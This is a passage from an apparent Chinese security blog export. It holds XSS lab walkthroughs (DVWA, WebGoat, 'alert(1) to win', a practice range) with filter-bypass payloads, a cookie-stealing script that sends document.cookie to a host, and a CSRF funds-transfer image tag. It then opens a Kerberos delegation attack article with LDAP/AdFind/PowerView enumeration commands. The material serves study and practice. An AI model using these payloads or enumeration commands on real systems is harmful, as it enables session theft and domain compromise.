<p>后台代码:</p>
<img src="/2020/04/03/xss-lou-dong-xue-xi/Users\尚慧亮\Desktop\QQ截图20200112141157.png" style="zoom: 50%;">

<p>注释里说保护的代码在客户端的里面。</p>
<p>我们尝试构造语句<script>alert(1)</script>发现没有任何反应。</p>
<p>我们查看源代码：</p>
<img src="/2020/04/03/xss-lou-dong-xue-xi/Users\尚慧亮\Desktop\QQ截图20200112141405.png" style="zoom: 80%;">

<p><img src="/2020/04/03/xss-lou-dong-xue-xi/C:%5CUsers%5C%E5%B0%9A%E6%85%A7%E4%BA%AE%5CDesktop%5CQQ%E6%88%AA%E5%9B%BE20200112141418.png" alt></p>
<p>发现这里对我们输入的参数并没有进行URL解码，所以我们输入的任何参数都是经过URL编码，然后直接赋值给option标签。所以，就不存在XSS漏洞了。</p>
<h4 id="XSS-stored"><a href="#XSS-stored" class="headerlink" title="XSS (stored)"></a>XSS (stored)</h4><p><strong>simple:</strong></p>
<img src="/2020/04/03/xss-lou-dong-xue-xi/Users\尚慧亮\Desktop\QQ截图20200112142234.png" style="zoom:33%;">

<p>出现一个留言框，直接在name中输入发现有字数限制，</p>
<p>直接使用火狐对页面元素进行修改。修改maxlength</p>
<p><img src="/2020/04/03/xss-lou-dong-xue-xi/C:%5CUsers%5C%E5%B0%9A%E6%85%A7%E4%BA%AE%5CDesktop%5CQQ%E6%88%AA%E5%9B%BE20200112142128.png" alt></p>
<p>或者使用burp抓包绕过前端限制。</p>
<p><strong>medium:</strong></p>
<p><img src="/2020/04/03/xss-lou-dong-xue-xi/C:%5CUsers%5C%E5%B0%9A%E6%85%A7%E4%BA%AE%5CDesktop%5CQQ%E6%88%AA%E5%9B%BE20200112142934.png" alt></p>
<p>str_replace():含有“<script>”的字符串替换为空</p>
<p>addslshes():函数返回在预定义字符之前添加反斜杠的字符串。</p>
<p>htmlspecialchars():函数把预定义的字符转换为HTML实体。</p>
<p>message防注入基本天衣无缝。。。。。</p>
<p>但是我们仍然可以通过name栏进行注入。</p>
<p>构造攻击语句：</p>
<p><code>&lt;Script&gt;document.location=&#39;http://127.0.0.1/1.php?cookie=&#39;+document.cookie;&lt;/script&gt;</code></p>
<h3 id="Webgoat-靶场-xss-部分"><a href="#Webgoat-靶场-xss-部分" class="headerlink" title="Webgoat 靶场 xss(部分)"></a>Webgoat 靶场 xss(部分)</h3><p><strong>stage 1: strored XSS</strong></p>
<ol>
<li>作为Tom，在个人简介编辑页执行存储型XSS攻击，验证Jerry会受到攻击影响。</li>
<li>使用Tom登录，修改Tom的个人简介编辑页的街道一栏，在其后添加,更新个人信息</li>
</ol>
<img src="C:\Users\尚慧亮\Desktop\QQ截图20200112164709.png" style="zoom: 50%;" />

<p>3.使用Jerry登录，选择Tom的个人信息进行查看，弹窗表明存储型XSS攻击成功。</p>
<img src="C:\Users\尚慧亮\Pictures\Saved Pictures\QQ截图20200112164941.png" style="zoom:50%;" />

<p><strong>Stage3:Stored XSS Revisited</strong></p>
<p>验证Bruce的个人简历中包含有XSS攻击，使用David用户登录，查看Bruce的个人简介，出现弹窗，表明存在XSS攻击。</p>
<img src="C:\Users\尚慧亮\Pictures\Saved Pictures\QQ截图20200112165159.png" style="zoom:50%;" />

<p><strong>Stage5:Reflected XSS</strong></p>
<p>1.利用查找职工页面的缺陷制作一个包含有反射型XSS的URL，验证其他使用这个链接的用户也会受到攻击影响。</p>
<p>2.使用用户Larry登录，在Search Staff搜索框中输入恶意代码。</p>
<img src="C:\Users\尚慧亮\Pictures\Saved Pictures\QQ截图20200112170452.png" style="zoom: 50%;" />

<p>使用tom登录查看搜素界面无法正常显示：</p>
<img src="C:\Users\尚慧亮\Pictures\Saved Pictures\QQ截图20200112170527.png" style="zoom:50%;" />

<h5 id="Stored-XSS-Attacks"><a href="#Stored-XSS-Attacks" class="headerlink" title="Stored XSS Attacks"></a><strong>Stored XSS Attacks</strong></h5><p>清除所有的输入是一个很好的选择，尤其是清除那些将被用作参数使用的输入。对于在应用程序中永久存储的内容特别重要。当用户的消息被检索时，不能出现不期望的消息内容。</p>
<p>在输入的内容中添加javascript代码，点击Submit按钮。</p>
<img src="C:\Users\尚慧亮\Pictures\Saved Pictures\QQ截图20200112171509.png" style="zoom:50%;" />

<p>点击我们刚刚创建好的帖子，触发xss</p>
<img src="C:\Users\尚慧亮\Pictures\Saved Pictures\QQ截图20200112171526.png" style="zoom:50%;" />

<h5 id="Reflected-XSS-Attacks"><a href="#Reflected-XSS-Attacks" class="headerlink" title="Reflected XSS Attacks"></a>Reflected XSS Attacks</h5><p> 在服务器端验证所有输入是一个很好的选择。未验证的用户输入可能会在HTTP响应中出现XSS。攻击者可以创建一个URL，通过让受害者点击的方式进行XSS攻击。</p>
<p>在digit access code框中添加攻击代码：</p>
<p>![](C:\Users\尚慧亮\Pictures\Saved Pictures\QQ截图20200112172146.png)0</p>
<p><strong>Cross Site Request Forgery (CSRF)</strong></p>
<p>​       在这一课中，您的目的是向一个新闻组发送一封邮件，邮件中包含一张图片，这个图像 的URL指向一个恶意请求。尝试一个包括1*1像素的图像，其中包含一个网址。这个URL 应当用一个额外的参数“transferFunds= 4000”指向CRSF课程页面。您可以通过左侧菜单在 CSRF课程连接上右键单击，选择复制快捷方式。无论谁收到这封邮件，并恰好已经通过身份验证，他的资金将会被转走。 <br>    注意:不同WebGoat环境的 URL中“Screen”和“Menu”参数可能会有所区别。注意使 用您但前访问URL中正在使用的参数。  </p>
<p>我们需要创建一个图片，链接到一个网站，格式如下：</p>
<p><code>&lt;img src=&quot;http://192.168.1.149/WebGoat/attack?Screen=52&amp;menu=900&amp;transferFunds=5000&quot; width=&quot;1&quot;height=&quot;1&quot;/&gt;</code></p>
<p>创建后提交</p>
<img src="C:\Users\尚慧亮\Pictures\Saved Pictures\QQ截图20200112173529.png" style="zoom:50%;" />

<p>点击刷新即可通关。</p>
<h3 id="XSS——alert-1-to-win"><a href="#XSS——alert-1-to-win" class="headerlink" title="XSS——alert(1)to win"></a>XSS——alert(1)to win</h3><p><strong>Warmup</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'&lt;script&gt;console.log("'</span> + s + <span class="string">'");&lt;/script&gt;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>代码直接拼接了输入的字符串，没有进行任何有效的过滤，我们尝试闭合即可。</p>
<p>")闭合前面的双引号和括号，后面使用// 或<!--注释“</p>
<p>尝试：<code>&quot;);alert(1) //</code>成功</p>
<p>也可以闭合前面的<script>标签</p>
<p>尝试:<code>&lt;/script&gt;;&lt;script&gt;alert(1)&lt;!--</code>成功</p>
<p><strong>Adobe</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">    s = s.replace(<span class="regexp">/"/g</span>, <span class="string">'\\"'</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'&lt;script&gt;console.log("'</span> + s + <span class="string">'");&lt;/script&gt;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>代码将输入的双引号用\进行了转义，所以无法通过进行双引号的闭合。</p>
<p>但我们还可以通过<script>标签闭合绕过。</p>
<p>或者在输入的双引号前在加一个\对转义双引号的\进行转义。如下：</p>
<p>尝试<code>\&quot;);alert(1)//</code></p>
<p><strong>JSON</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">  s = <span class="built_in">JSON</span>.stringify(s);</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'&lt;script&gt;console.log('</span> + s + <span class="string">');&lt;/script&gt;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>JSON 通常用于与服务端交换数据。</p>
<p>在向服务器发送数据时一般是字符串。</p>
<p>我们可以使用 JSON.stringify() 方法将 JavaScript 对象转换为字符串。</p>
<p>过滤了,"等字符。</p>
<p>尝试<code>&lt;/script&gt;&lt;script&gt;alert(1)//</code>成功</p>
<p><strong>Markdown</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> text = s.replace(<span class="regexp">/&lt;/g</span>, <span class="string">'&amp;lt;'</span>).replace(<span class="regexp">/"/g</span>, <span class="string">'&amp;quot;'</span>);</span><br><span class="line">    <span class="comment">// URLs</span></span><br><span class="line">    text = text.replace(<span class="regexp">/(http:\/\/\S+)/g</span>, <span class="string">'&lt;a href="$1"&gt;$1&lt;/a&gt;'</span>);</span><br><span class="line">    <span class="comment">// [[img123|Description]]</span></span><br><span class="line">    text = text.replace(<span class="regexp">/\[\[(\w+)\|(.+?)\]\]/g</span>, <span class="string">'&lt;img alt="$2" src="$1.gif"&gt;'</span>);</span><br><span class="line">    <span class="keyword">return</span> text;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>s.replace将<strong>< "</strong>转换成立HTML实体</p>
<p>text.replace意思为判断输入中是否含有http://,如果有就生成一个a标签,</p>
<p>第三波，如果字符串包含<code>[[img_src|img_alt]]</code>格式的字符串，则变为</p>
<p><code>&lt;img alt=&quot;img_alt&quot; src=&quot;img_src.gif&quot;&gt;</code></p>
<p><strong>Fruit</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// CVE-2016-4618</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> div = <span class="built_in">document</span>.implementation.createHTMLDocument().createElement(<span class="string">'div'</span>);</span><br><span class="line">  div.innerHTML = s;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params">n</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">'SCRIPT'</span> === n.tagName) n.parentNode.removeChild(n);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>; i&lt;n.attributes.length; i++) &#123;</span><br><span class="line">      <span class="keyword">var</span> name = n.attributes[i].name;</span><br><span class="line">      <span class="keyword">if</span> (name !== <span class="string">'class'</span>) &#123; n.removeAttribute(name); &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  [].map.call(div.querySelectorAll(<span class="string">'*'</span>), f);</span><br><span class="line">  <span class="keyword">return</span> div.innerHTML;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>代码给出了漏洞编号,查了一下得知；</p>
<p>问题来源于代码的逻辑不严谨，在<code>for</code>循环中，代码通过<code>n.attributes.length</code>来判断边界条件，但是<code>n.attributes.length</code>是动态变化的，如果存在多个属性，则最后一个属性是无法删除的，只要我们构造多个属性即可。</p>
<p><code>&lt;iframe t onload=alert(1)&gt;</code></p>
<h3 id="小迪XSS靶场"><a href="#小迪XSS靶场" class="headerlink" title="小迪XSS靶场"></a>小迪XSS靶场</h3><h5 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h5><p>我们需要闭合前面的文本标签</p>
<p><code>&lt;/textarea&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></p>
<img src="C:\Users\尚慧亮\Pictures\Saved Pictures\QQ截图20200201205424.png" style="zoom:50%;" />

<h5 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h5><p>过滤了圆括号(),但是我们仍然可以使用反引号执行.</p>
<p><code>&lt;script&gt;alert</code>1<code>&lt;/script&gt;</code></p>
<p>![](C:\Users\尚慧亮\Pictures\Saved Pictures\QQ截图20200120202706.png)</p>
<h5 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h5><p>过滤了圆括号（）  反引号 `<br> 用<svg>标签中可以直接执行实体字符</p>
<p>![](C:\Users\尚慧亮\Pictures\Saved Pictures\QQ截图20200120203328.png)</p>
<h5 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h5><p>这里使用!-->闭合</p>
<p><code>!--&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></p>
<p>![](C:\Users\尚慧亮\Pictures\Saved Pictures\QQ截图20200120203548.png)</p>
<h5 id="0x06"><a href="#0x06" class="headerlink" title="0x06"></a>0x06</h5><p>​        过滤以auto开头或者on开头，=等号结尾的标签属性并替换成下划线_ , 且忽略大小写，虽然看起来好像无解了。但是这里我们可以通过换行来绕过正则的检查，看源码写的type=“text”<br> 是文本格式无法执行，我们用type=“image”绕过 </p>
<p>![](C:\Users\尚慧亮\Pictures\Saved Pictures\QQ截图20200120204137.png)</p>
<h5 id="0x07"><a href="#0x07" class="headerlink" title="0x07"></a>0x07</h5><p>\w+:多个 英文字母或数字或下划线组成的<br> /?: 0个或1个/<br> g: 全局匹配<br> i: 不区分大小写</p>
<p>这里过滤了<多个字母或数字> 也就是说 <a>, </a> <111> 全部替换成空，可以用低优先级来解决去掉末尾的></p>
<figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">&lt;<span class="keyword">body</span> onload=<span class="string">"alert(1)"</span></span><br></pre></td></tr></table></figure>



<p>![](C:\Users\尚慧亮\Pictures\Saved Pictures\QQ截图20200120204654.png)</p>
<h5 id="0x08"><a href="#0x08" class="headerlink" title="0x08"></a>0x08</h5><p>​      代码中将</style>标签替换成/ u574Fu4EBA /，且忽略大小写；正则的目的在于防止我们闭合<style>标签，但是这里我们依然可以通过换行绕过正则进行闭合。</p>
<p>![](C:\Users\尚慧亮\Pictures\Saved Pictures\QQ截图20200120204809.png)</p>
<h5 id="0x09"><a href="#0x09" class="headerlink" title="0x09"></a>0x09</h5><p>代码要求我们以<a href="https://www.segmentfault.com开头，输入点是在" target="_blank" rel="noopener">https://www.segmentfault.com开头，输入点是在</a><>标签中，我们可以用</script>闭合前面 在后面加注释绕过</p>
<p><code>https://www.segmentfault.com&quot;&gt;&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;//</code></p>
<p>![](C:\Users\尚慧亮\Pictures\Saved Pictures\QQ截图20200120205401.png)</p>
<h4 id="xss常见绕过waf方法"><a href="#xss常见绕过waf方法" class="headerlink" title="xss常见绕过waf方法"></a>xss常见绕过waf方法</h4><p>可以参考这篇文章：<a href="https://blog.csdn.net/God_XiangYu/article/details/99592359，写的很全面，" target="_blank" rel="noopener">https://blog.csdn.net/God_XiangYu/article/details/99592359，写的很全面，</a></p>
<h4 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h4><p><a href="https://blog.csdn.net/SKI_12/article/details/60468362" target="_blank" rel="noopener">https://blog.csdn.net/SKI_12/article/details/60468362</a></p>
<p><a href="https://www.cnblogs.com/leestar54/p/5798937.html" target="_blank" rel="noopener">https://www.cnblogs.com/leestar54/p/5798937.html</a></p>
<p><a href="https://cloud.tencent.com/developer/article/1517634" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/1517634</a></p>
<p><a href="https://wetest.qq.com/lab/view/422.html?from=content_gad" target="_blank" rel="noopener">https://wetest.qq.com/lab/view/422.html?from=content_gad</a></p>
]]></content>
      <categories>
        <category>web漏洞学习</category>
      </categories>
      <tags>
        <tag>xss漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>kerberos域委派攻击学习</title>
    <url>/2020/08/05/kerberos-yu-wei-pai-gong-ji-xue-xi/</url>
    <content><![CDATA[<h2 id="Kerberos委派攻击学习"><a href="#Kerberos委派攻击学习" class="headerlink" title="Kerberos委派攻击学习"></a>Kerberos委派攻击学习</h2><h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>​    域委派是大型网络中经常部署的应用模式，给多跳认证带来很大的便利，同时也带来很大的安全隐患，利用 委派可获取域管理员权限，甚至制作深度隐藏的后门域委派是指将域内用户的权限委派给服务账号，使得服务账号能以用户权限开展域内活动。</p>
<h4 id="域委派的基本过程"><a href="#域委派的基本过程" class="headerlink" title="域委派的基本过程"></a>域委派的基本过程</h4><p>​    委派（Delegation）是kerberos相对于NTLM认证独有的特性，指的是A可以让B<strong>“代理”</strong>自己去访问C服务，说是代理，也可以理解为<strong>“假冒”</strong>。</p>
<p>​    具体为：域中A使用Kerberos身份验证访问域中的服务B，而B再利用A的身份去请求域中的服务C，因为用的是A的身份，所以只有A有权限访问C的时候，委派才能成功。</p>
<p><img src="/2020/08/05/kerberos-yu-wei-pai-gong-ji-xue-xi/20200505104626.png-water_print" alt="img"></p>
<p>​        一个域内普通用户jack通过Kerberos协议认证到前台WEB服务后，前台运行WEB服务的<strong>服务账号websvc</strong>模拟（ Impersonate）用户jack，以Kerberos协议继续认证到后台服务器，从而在后台服务器中获取jack用户的访问权限，即域中跳或者多跳的Kerberos认证。</p>
<ul>
<li>域内用户jack以Kerberos方式认证后访问Web服务器；</li>
<li>Web服务以websvc服务账号运行，websvc向KDC发起jack用户的票据申请。</li>
<li>KDC检查websvc用户的委派属性，如果被设置， 则返回jack用户的可转发票据TGT；</li>
<li>websvc收到jack用户TGT后，使用该票据向KDC 申请访问文件服务器的服务票据TGS；</li>
<li>KDC检查websvc的委派属性，如果被设置，且申请的文件服务在允许的列表清单中，则返回一个jack用户 访问文件服务的授权票据TGS；</li>
<li>websvc收到的jack用户的授权票据TGS后，可访问文件服务，完成多跳认证。</li>
</ul>
<h4 id="委派分类"><a href="#委派分类" class="headerlink" title="委派分类"></a>委派分类</h4><h5 id="非约束性委派"><a href="#非约束性委派" class="headerlink" title="非约束性委派"></a>非约束性委派</h5><p>​    非约束性委派(Unconstrained Delegation)，服务账号可以获取某用户的 TGT，从而服务账号可使用该 TGT，模拟用户<strong>访问任意服务</strong></p>
<p>​    如果某个服务 A 的服务账号 B 被设置为非约束委派，当用户 C 通过 Kerberos 认证访问服务 A 时，KDC 会检查服务账号 B 的属性，发现是非约束性委派时，KDC 会将用户 C 的 TGT 放在 TGS 中，这样 B 在验证 TGS 的同时获取了 A 用户的 TGT，从而可以模拟用户 A 访问<code>任意</code>服务</p>
<p><img src="/2020/08/05/kerberos-yu-wei-pai-gong-ji-xue-xi/WX20200414-123835@2x.png" alt="img"></p>
<ol>
<li>用户向KDC请求可转发TGT，记为TGT1</li>
<li>KDC返回TGT1</li>
<li>用户通过TGT1向KDC请求转发TGT2</li>
<li>KDC返回TGT2</li>
<li>用户通过TGT1向KDC申请访问服务1的RST</li>
<li>KDC返回RST</li>
<li>用户发送RST、TGT1、TGT2和TGT2的SessionKey给服务1</li>
<li>服务1通过用户的TGT2请求KDC，以用户名义请求服务2的RST（服务访问票据）</li>
<li>KDC给服务1返回服务2的RST</li>
<li>服务1以用户名义向服务2发出请求</li>
<li>服务2响应服务1的请求</li>
<li>服务1响应用户第7步骤的请求</li>
</ol>
<p>这个流程有一个问题：<strong>TGT2是不被限制的，服务1完全可以用它来请求访问任何想访问的服务。</strong>攻击其实就是利用的这点，使用从高权限账户处得到的TGT去获取权限。</p>
<h5 id="约束性委派"><a href="#约束性委派" class="headerlink" title="约束性委派"></a>约束性委派</h5><p>因为非约束委派很不安全，所以微软又发布了约束委派，区别在于不会直接把TGT给服务，所发送的认证信息中包含了允许访问的服务，即不允许服务代表用户去访问其他服务。</p>
<p>其实现主要依靠一组kerberos扩展：<code>S4U2Self</code>（Service for User to Self）和<code>S4U2Proxy</code>（Service for User to Proxy）</p>
<p><img src="/2020/08/05/kerberos-yu-wei-pai-gong-ji-xue-xi/WX20200414-123923@2x.png" alt="img"></p>
<p>流程如下：</p>
<ol>
<li>用户向服务1发出请求</li>
<li>在此之前服务1已经得到了用户访问服务1的TGT，接下来通过S4U2self扩展模拟用户向KDC请求ST</li>
<li>KDC返回给服务1一个用于验证服务1的ST</li>
<li>服务1使用第三步的ST响应用户的请求</li>
<li>用户再次向服务1发起请求，委派服务1访问服务2，条件是服务1验证通过且有有效的TGT，以及服务1有用户到服务1的可转发ST，即ST1</li>
<li>服务1通过S4U2Proxy扩展请求KDC返回一个用于验证服务2的ST，即ST2</li>
<li>KDC在验证PAC的数字签名后,如果没有失败（成功或没有PAC），将返回ST2给服务1</li>
<li>服务1代表用户使用ST2请求服务2，服务2判断此用户是否经过KDC验证，依据为ST2中的cname和crealm标识</li>
<li>服务2响应服务1的请求</li>
<li>服务1响应用户请求</li>
</ol>
<p><img src="/2020/08/05/kerberos-yu-wei-pai-gong-ji-xue-xi/20200505111706.png-water_print" alt="img"></p>
<h4 id="查找具有委派属性的服务账号"><a href="#查找具有委派属性的服务账号" class="headerlink" title="查找具有委派属性的服务账号"></a>查找具有委派属性的服务账号</h4><h5 id="非约束委派的查找"><a href="#非约束委派的查找" class="headerlink" title="非约束委派的查找"></a>非约束委派的查找</h5><h6 id="ldapsearch"><a href="#ldapsearch" class="headerlink" title="ldapsearch"></a>ldapsearch</h6><blockquote>
<p>kali上自带，适合在域外查询</p>
</blockquote>
<p>这个参数过多就不一一列举了，需要查阅的<code>ldapsearch -h</code>即可</p>
<p>查找域中配置非约束委派的用户：</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">ldapsearch</span> -x -H ldap://192.168.141.145:389 -D <span class="string">"CN=qiyou,CN=Users,DC=qiyou,DC=com"</span> -w password -b <span class="string">"DC=qiyou,DC=com"</span> <span class="string">"(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))"</span> |grep -iE <span class="string">"distinguishedName"</span></span><br></pre></td></tr></table></figure>

<p>过滤条件</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">(&amp;(samAccountType=<span class="number">805306368</span>)(userAccountControl:<span class="number">1.2</span><span class="number">.840</span><span class="number">.113556</span><span class="number">.1</span><span class="number">.4</span><span class="number">.803</span>:=<span class="number">524288</span>))</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/05/kerberos-yu-wei-pai-gong-ji-xue-xi/20200206165316-1da1e568-48be-1.png" alt="img"></p>
<p>查找域中配置非约束委派的主机：</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">ldapsearch</span> -x -H ldap://192.168.141.145:389 -D <span class="string">"CN=qiyou,CN=Users,DC=qiyou,DC=com"</span> -w password -b <span class="string">"DC=qiyou,DC=com"</span> <span class="string">"(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))"</span> |grep -iE <span class="string">"distinguishedName"</span></span><br></pre></td></tr></table></figure>

<p><strong>注</strong>：域控主机账户默认开启非约束委派</p>
<p>过滤条件</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">(&amp;(samAccountType=<span class="number">805306369</span>)(userAccountControl:<span class="number">1.2</span><span class="number">.840</span><span class="number">.113556</span><span class="number">.1</span><span class="number">.4</span><span class="number">.803</span>:=<span class="number">524288</span>))</span><br></pre></td></tr></table></figure>

<p><strong>注</strong>：更多LDAP的过滤语法请参考微软的手册：<a href="https://social.technet.microsoft.com/wiki/contents/articles/5392.active-directory-ldap-syntax-filters.aspx?Sort=MostUseful" target="_blank" rel="noopener">地址</a></p>
<p><img src="/2020/08/05/kerberos-yu-wei-pai-gong-ji-xue-xi/20200206163923-2d25d118-48bc-1.png" alt="img"></p>
<p><strong>注</strong>：区别服务用户和主机的区别是<code>samAccountType=805306368 (0x30000000)</code>时为用户，<code>samAccountType=805306369 (0x30000001)</code>时为主机</p>
<h6 id="ADFind"><a href="#ADFind" class="headerlink" title="ADFind"></a>ADFind</h6><p>使用参数</p>
<figure class="highlight armasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">AdFind</span> [<span class="keyword">switches] </span>[-<span class="keyword">b </span><span class="keyword">basedn] </span>[-f filter] [<span class="meta">attr</span> list]</span><br></pre></td></tr></table></figure>

<p>参数说明：</p>
<ul>
<li>-b：指定要查询的根节点</li>
<li>-f：LDAP过滤条件</li>
<li>attr list：需要显示的属性</li>
</ul>
<p>查找域中配置非约束委派的用户：</p>
<figure class="highlight armasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">AdFind.exe</span> -<span class="keyword">b </span><span class="string">"DC=qiyou,DC=com"</span> -f <span class="string">"(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))"</span> <span class="meta">cn</span> distinguishedName</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/05/kerberos-yu-wei-pai-gong-ji-xue-xi/20200211171505-fdc6fd1a-4cae-1.png" alt="img"></p>
<p>查找域中配置非约束委派的主机：</p>
<figure class="highlight armasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">AdFind.exe</span> -<span class="keyword">b </span><span class="string">"DC=qiyou,DC=com"</span> -f <span class="string">"(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))"</span> <span class="meta">cn</span> distinguishedName</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/05/kerberos-yu-wei-pai-gong-ji-xue-xi/20200211171701-43418342-4caf-1.png" alt="img"></p>
<h6 id="PowerView"><a href="#PowerView" class="headerlink" title="PowerView"></a>PowerView</h6><p>查找域中配置非约束委派用户</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Get</span>-NetUser -Unconstrained -<span class="keyword">Domain</span> qiyou.com |<span class="keyword">select</span> <span class="type">name</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/05/kerberos-yu-wei-pai-gong-ji-xue-xi/20200205215906-acc0ea0e-481f-1.png" alt="img"></p>
<p>查找域中配置非约束委派的主机：</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Get</span>-NetComputer -Unconstrained -<span class="keyword">Domain</span> qiyou.com</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/05/kerberos-yu-wei-pai-gong-ji-xue-xi/20200205220057-ee88c01a-481f-1.png" alt="img"></p>
<p>查询域中配置非约束委派的主机（另外一个版本的powerview）：</p>
<figure class="highlight mathematica"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Get</span>-DomainComputer -Unconstrained -<span class="keyword">Properties</span> distinguishedname,useraccountcontrol -<span class="keyword">Verbose</span> | ft -Wrap -AutoSize</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/05/kerberos-yu-wei-pai-gong-ji-xue-xi/20200205220213-1bd856d4-4820-1.png" alt="img"></p>
<h5 id="约束委派的查找"><a href="#约束委派的查找" class="headerlink" title="约束委派的查找"></a>约束委派的查找</h5><h6 id="ldapsearch-1"><a href="#ldapsearch-1" class="headerlink" title="ldapsearch"></a>ldapsearch</h6><p>查找域中配置约束委派用户</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">ldapsearch</span> -x -H ldap://192.168.141.145:389 -D <span class="string">"CN=qiyou,CN=Users,DC=qiyou,DC=com"</span> -w password -b <span class="string">"DC=qiyou,DC=com"</span> <span class="string">"(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))"</span> |grep -iE <span class="string">"distinguishedName|allowedtodelegateto"</span></span><br></pre></td></tr></table></figure>

<p>过滤条件</p>
<figure class="highlight hy"><table><tr><td class="code"><pre><span class="line">(<span class="name"><span class="builtin-name">&amp;</span></span>(<span class="name">samAccountType=805306368</span>)(<span class="name">msds-allowedtodelegateto=*</span>))</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/05/kerberos-yu-wei-pai-gong-ji-xue-xi/20200206165805-c9d9c512-48be-1.png" alt="img"></p>
<p>查找域中配置约束委派的主机：</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">ldapsearch</span> -x -H ldap://192.168.141.145:389 -D <span class="string">"CN=qiyou,CN=Users,DC=qiyou,DC=com"</span> -w password -b <span class="string">"DC=qiyou,DC=com"</span> <span class="string">"(&amp;(samAccountType=805306369)(msds-allowedtodelegateto=*))"</span> |grep -iE <span class="string">"distinguishedName|allowedtodelegateto"</span></span><br></pre></td></tr></table></figure>

<p>过滤条件</p>
<figure class="highlight hy"><table><tr><td class="code"><pre><span class="line">(<span class="name"><span class="builtin-name">&amp;</span></span>(<span class="name">samAccountType=805306369</span>)(<span class="name">msds-allowedtodelegateto=*</span>))</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/05/kerberos-yu-wei-pai-gong-ji-xue-xi/20200206164433-e5901240-48bc-1.png" alt="img"></p>
<h6 id="ADFind-1"><a href="#ADFind-1" class="headerlink" title="ADFind"></a>ADFind</h6><p>查找域中配置约束委派用户</p>
<figure class="highlight armasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">AdFind.exe</span> -<span class="keyword">b </span><span class="string">"DC=qiyou,DC=com"</span> -f <span class="string">"(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))"</span> <span class="meta">cn</span> distinguishedName msds-allowedtodelegateto</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/05/kerberos-yu-wei-pai-gong-ji-xue-xi/20200211172106-d50ce7da-4caf-1.png" alt="img"></p>
<p>查找域中配置约束委派的主机：</p>
<figure class="highlight armasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">AdFind.exe</span> -<span class="keyword">b </span><span class="string">"DC=qiyou,DC=com"</span> -f <span class="string">"(&amp;(samAccountType=805306369)(msds-allowedtodelegateto=*))"</span> <span class="meta">cn</span> distinguishedName msds-allowedtodelegateto</span><br></pre></td></tr></table></figure>

